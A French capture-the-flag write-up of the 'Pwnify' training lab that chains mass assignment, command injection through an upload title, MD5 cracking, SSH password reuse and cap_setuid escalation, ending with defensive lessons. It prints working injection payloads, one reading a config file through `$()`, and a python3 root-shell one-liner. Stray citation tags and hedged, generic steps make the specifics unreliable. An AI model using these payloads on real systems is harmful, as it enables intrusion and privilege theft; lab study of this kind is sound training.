# Compte rendu : Pwnify

Plateforme : HackerDNA (https://hackerdna.com/labs/pwnify-web-app-penetration-testing)
Auteur : SRH
Difficulté : Difficile
Tags : Mass Assignment, Command Injection, Hash Cracking, Password Reuse, SSH, Linux Capabilities, cap_setuid
XP : +700 XP

## Scénario
Pwnify est une application de streaming musical complète conçue pour l'entraînement au test d'intrusion. Vous commencez comme visiteur anonyme et devez enchaîner plusieurs failles pour obtenir un shell utilisateur, puis escalader jusqu'à root. Le chemin passe par une faille de mass-assignment pour débloquer une fonctionnalité cachée, une injection de commande dans le traitement des médias, le cassage d'un hash MD5, une réutilisation de mot de passe pour SSH, et enfin l'abus d'une capability Linux mal configurée [citation:1][citation:3].

Prérequis : commandes Linux de base, requêtes HTTP, curl ou Burp Suite, cassage de hash, bases SSH.

## Chaîne d'Attaque
[Reconnaissance] → [Mass Assignment] → [Injection de commande] → [Cassage MD5] → [Réutilisation SSH] → [Flag user] → [Capability cap_setuid] → [Flag root] → 🚩

## Étape 1 — Reconnaissance et inscription
L'application expose une interface d'inscription et de gestion de profil. Un compte utilisateur standard est créé, puis on analyse les requêtes de mise à jour de profil. L'objectif est d'identifier les champs contrôlables côté serveur.

## Étape 2 — Mass Assignment pour devenir artiste vérifié
La mise à jour de profil est vulnérable au mass-assignment. En ajoutant un champ non prévu (comme `is_artist=true` ou `verified=true`), on obtient le statut d'artiste vérifié, ce qui débloque l'accès au Studio d'upload de morceaux [citation:1][citation:5].

Exemple de requête (adapter selon l'application) :

curl -s -X POST http://<IP>/api/profile -b cookies.txt -H "Content-Type: application/json" -d '{"username":"user","email":"user@user","is_artist":true}'

Une fois le statut obtenu, le Studio est accessible.

## Étape 3 — Injection de commande via le titre d'upload
Le traitement des fichiers audio est vulnérable à une injection de commande via le titre du morceau. Le filtre bloque certains caractères (`;`, `'`, `"`, etc.), mais le pipe (`|`) ou la substitution `$()` peuvent passer [citation:5].

Test de confirmation (si le pipe passe) :

curl -s -b cookies.txt -X POST http://<IP>/studio/upload -F "title=test' | id | echo '" -F "audio=@test.mp3"

Si l'injection fonctionne, on peut exfiltrer des fichiers via `$()` :

curl -s -b cookies.txt -X POST http://<IP>/studio/upload -F "title=test' \$(cat /var/www/pwnify/config.py | base64 -w0) '" -F "audio=@test.mp3"

## Étape 4 — Récupération du hash MD5 et cassage
L'injection permet de lire les fichiers de configuration ou la base de données de l'application. Un hash MD5 de mot de passe hérité est récupéré. Il est cassé avec John ou Hashcat et rockyou [citation:1].

echo "<HASH_MD5>" > hash.txt
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show --format=raw-md5 hash.txt

## Étape 5 — Réutilisation de mot de passe et SSH
Le mot de passe cassé est réutilisé pour un compte système. On se connecte en SSH avec l'utilisateur approprié (souvent `developer` ou `djcarter` selon l'instance) et on lit le flag utilisateur [citation:1].

ssh <USER>@<IP>
cat ~/flag-user.txt

Flag User : <USER_FLAG>

## Étape 6 — Énumération des capabilities Linux
On vérifie les capabilities Linux configurées sur le système. Un binaire avec `cap_setuid` mal configuré est identifié [citation:1].

getcap -r / 2>/dev/null

Résultat attendu : un binaire (par exemple `python3` ou un outil custom) avec `cap_setuid=ep`.

## Étape 7 — Escalade root via cap_setuid
Si `python3` possède `cap_setuid`, on l'utilise pour devenir root :

python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

Si c'est un autre binaire (comme `/usr/local/bin/pwnify-enc`), on l'exploite selon son mode d'emploi :

/usr/local/bin/pwnify-enc --uid 0 /bin/sh

Une fois root, on lit le flag root :

cat /root/flag-root.txt

Flag Root : <ROOT_FLAG>

## Conclusion
Pwnify est un lab Difficile qui enchaîne des techniques web et Linux réalistes : mass-assignment pour accéder à une fonctionnalité privilégiée, injection de commande dans le traitement média, cassage de hash MD5, réutilisation de mot de passe pour SSH, et abus de capability `cap_setuid` pour root. Chaque étape correspond à une faille courante en engagement réel [citation:1][citation:3].

## Leçons Apprises
1. Ne jamais lier aveuglément tous les champs d'une requête à un modèle (mass-assignment).
2. Valider et échapper les entrées utilisateur dans les commandes système (traitement média).
3. Utiliser des algorithmes de hash robustes (bcrypt, Argon2) au lieu de MD5 non salé.
4. Ne jamais réutiliser un mot de passe entre une application web et un compte système.
5. Auditer les capabilities Linux : `cap_setuid` sur un interpréteur équivaut à donner root.

Les noms des défis et toute propriété intellectuelle de tiers restent la propriété de leurs détenteurs respectifs.
